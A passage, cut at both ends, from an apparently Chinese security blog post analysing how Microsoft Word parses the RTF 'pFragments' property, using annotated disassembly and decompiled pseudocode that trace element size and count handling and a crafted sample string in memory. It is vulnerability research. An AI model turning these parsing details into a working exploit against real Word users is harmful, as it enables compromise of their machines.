class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E18                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1B8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1A                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   esi = [ebp+0x8] = [0x0011B1C0] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1E                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1F                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   edi = [ebp+0x10] = [0x0011B1B8+0x10] = [0x0011B1C8] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E22                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = ebp+0x8 = 0x0011B1C0(a1地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E25                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011B1C0(a1地址) </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E26                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   eax = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2A                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">; arg2: edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2B                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2C                 <span class="keyword">call</span>    sub_32608E81</span><br><span class="line"><span class="symbol">            .text:</span>32608E31                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x00000001</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E33                 <span class="keyword">jz</span>      loc_32BD823F             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E39                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   eax = [ebp+0xc] = [0x0011B1C4] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E3C                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   ecx = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E40                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">7FFFh</span>               <span class="comment">;   eax = eax&amp;0x7FFF = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E45                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                 <span class="comment">;   eax = eax&lt;&lt;0x10 = 0x00040000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E48                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax or ecx = 0x00040006</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4A                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   ecx = [ebp+0x14] = [0x0011B1CC] = 0x00000000(a4)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4D                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span>                 <span class="comment">;   edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4F                 <span class="keyword">cmp</span>     <span class="built_in">edi</span>, <span class="built_in">edx</span>                 <span class="comment">;   edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E51                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">8</span>], <span class="built_in">eax</span>             <span class="comment">;   [esi+8] = [0x05D755CC+8] = [0x05D755D4] = eax = 0x00040006  &lt;---- 关键对象的第4个dword重新赋值</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E54                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = esi+0xc = 0x05D755CC+0xc = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E57                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>], <span class="built_in">edx</span>               <span class="comment">;   [esi] = [0x05D755CC] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E59                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edx</span>             <span class="comment">;   [esi+4] = [0x05D755D0] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5C                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">edx</span>               <span class="comment">;   [eax] = [0x05D755D8] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5E                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">10h</span>], <span class="built_in">ecx</span>           <span class="comment">;   [esi+0x10] = [0x05D755CC+0x10] = [0x05D755DC] = ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E61                 <span class="keyword">jbe</span>     short loc_32608E78       <span class="comment">;   不大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E63                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E64                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E65                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">;   [ebp+8] = [0x0011B1B8+8] = [0x0011B1C0] = 0x18</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E68                 <span class="keyword">call</span>    MSO_234                  <span class="comment">; </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6F                 <span class="keyword">jl</span>      loc_32BD823F </span><br><span class="line"><span class="symbol">            .text:</span>32608E75                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edi</span>             <span class="comment">;   [0x05D755CC+4] = [0x05D755D0] = 0x4</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E78</span><br><span class="line"><span class="symbol">            .text:</span>32608E78 loc_32608E78:                        </span><br><span class="line"><span class="symbol">            .text:</span>32608E78                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7A                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7B</span><br><span class="line"><span class="symbol">            .text:</span>32608E7B loc_32608E7B:                          </span><br><span class="line"><span class="symbol">            .text:</span>32608E7B                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x6</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7C                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7D                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7E                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>326098C8                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C9                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>326CCBCA                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBCC                 <span class="keyword">jz</span>      loc_32C9663A                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD2                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]             <span class="comment">;   eax = [ebp+0xc] = [0x0011B1F4] = 0x0011B260(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD5                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">esi</span>                   <span class="comment">;   [eax] = [0x0011B260] = esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD7                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD9                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA</span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA loc_326CCBDA:                         </span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0004;(ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDB                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDC                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过仔细分析，我们可以发现，对<code>“pFragments”</code>属性数据的<code>处理逻辑</code>，都在<code>wwlib.dll</code>的<code>sub_31FD724E</code>函数中，但是分析了这么久，只找到了<code>“6;5;”</code>中的<code>“6”</code>和<code>“5”</code>，也就是<code>数组元素的大小</code>和<code>数组元素个数</code>都使用<code>10进制</code>表示的，未做其他判断。从前面rtf的文档中关于<code>“pFragments”</code>属性的介绍可以知道，<code>数组元素的大小</code>可以为<code>2、4或8</code>，这个并没有找到。我们通过IDA的<code>F5反编译</code>功能，查看<code>sub_31FD724E</code>的伪代码，或许会发现点什么：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_31FD724E</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    _BYTE *temp_ptr; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> el_size_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> el_size; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">int</span> el_count_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> byte_num; <span class="comment">// eax</span></span><br><span class="line">    HGLOBAL mem_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> index; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">char</span> *mem_lock_ptr; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> chr; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> new_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex1; <span class="comment">// cl</span></span><br><span class="line">    _BYTE *group_part_ptr2; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *group_part_ptr; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">char</span> current_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">int</span> count1; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr1; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> case_num; <span class="comment">// [esp+Ch] [ebp-64h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value1; <span class="comment">// [esp+38h] [ebp-38h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value2; <span class="comment">// [esp+3Ch] [ebp-34h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value; <span class="comment">// [esp+40h] [ebp-30h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value1; <span class="comment">// [esp+44h] [ebp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> Src; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">    LPCVOID pMem; <span class="comment">// [esp+54h] [ebp-1Ch]</span></span><br><span class="line">    _BYTE *group_part_ptr1; <span class="comment">// [esp+60h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> *count2; <span class="comment">// [esp+64h] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">int</span> *key_object; <span class="comment">// [esp+68h] [ebp-8h]</span></span><br><span class="line">    LPSTREAM el_count; <span class="comment">// [esp+6Ch] [ebp-4h]</span></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span>, <span class="keyword">int</span> *))(v44 + <span class="number">344</span>))(v42, v43, &amp;case_num); <span class="comment">// sub_329202C7,result = 1</span></span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    result = case_num; <span class="comment">//case_num = 6</span></span><br><span class="line">    <span class="keyword">switch</span> ( case_num )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            temp_ptr = (_BYTE *)*((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            el_size_ptr = *((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 6;5;11111111</span></span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr != <span class="string">';'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*++temp_ptr )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    el_size = sub_31BAF3C6(el_size_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_size = 6</span></span><br><span class="line">    el_count_ptr = (<span class="keyword">int</span>)temp_ptr;</span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++temp_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    el_count = (LPSTREAM)sub_31BAF3C6(el_count_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_count = 5</span></span><br><span class="line">    <span class="comment">// 如果el_size为0,MSO_379-&gt;MSO_501-&gt;sub_32608E17-&gt;sub_32608E81中的"32608EAE div ecx"会出错</span></span><br><span class="line">    <span class="comment">// el_size被当做"div ecx"中的除数(ecx)</span></span><br><span class="line">    result = MSO_379(el_size, &amp;key_object);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// el_size如果为2,4,8会进行额外处理，非2,4,8则不会处理</span></span><br><span class="line">    <span class="keyword">switch</span> ( el_size )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_88:</span><br><span class="line">                array_element_value = (<span class="keyword">unsigned</span> __int16)sub_32046D00(array_element_ptr); <span class="comment">// 10进制字符串转化为10进制整型值</span></span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value, count) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            count1 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr1 = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_79:</span><br><span class="line">                array_element_value1 = sub_32046D00(array_element_ptr1);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value1, count1) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count1 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:             <span class="comment">// 当el_size为8时，为一组两个数字，如：(0,100)</span></span><br><span class="line">            group_part_ptr2 = <span class="number">0</span>;</span><br><span class="line">            group_part_ptr1 = <span class="number">0</span>;</span><br><span class="line">            count2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( !*temp_ptr )</span><br><span class="line">            &#123;</span><br><span class="line">            LABEL_72:</span><br><span class="line">                group_part_value1 = sub_32046D00(group_part_ptr1);</span><br><span class="line">                group_part_value2 = sub_32046D00(group_part_ptr2);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span> *))(*key_object + <span class="number">12</span>))(key_object, &amp;group_part_value1, count2) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                count2 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)count2 + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">            group_part_ptr = temp_ptr + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                current_char = *temp_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( current_char == <span class="string">'('</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    group_part_ptr1 = group_part_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( current_char == <span class="string">','</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        group_part_ptr2 = group_part_ptr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ( current_char != <span class="string">')'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *temp_ptr = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        LABEL_71:</span><br><span class="line">                ++temp_ptr;</span><br><span class="line">                ++group_part_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    byte_num = MSO_294(temp_ptr);                 <span class="comment">// 计算pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号</span></span><br><span class="line">    count2 = (<span class="keyword">int</span> *)byte_num;</span><br><span class="line">    mem_ptr = GlobalAlloc(<span class="number">0x40</span>u, (byte_num + <span class="number">1</span>) / <span class="number">2</span>); <span 